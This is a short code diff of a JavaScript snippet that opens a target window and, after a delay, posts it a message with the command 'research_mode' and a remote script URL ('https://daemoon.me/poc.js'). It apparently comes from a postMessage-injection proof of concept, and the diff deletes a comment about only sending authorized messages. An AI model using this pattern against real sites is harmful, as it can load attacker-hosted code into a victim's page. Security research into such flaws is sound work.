@@ -15,7 +15,6 @@
     document.getElementById("send").addEventListener("click", () => {
       popup = window.open(url);
       setTimeout(() => {
-        // Only send messages you are authorized to send
         popup.postMessage(JSON.stringify({
                 command: "research_mode",
                 data: ["https://daemoon.me/poc.js"]
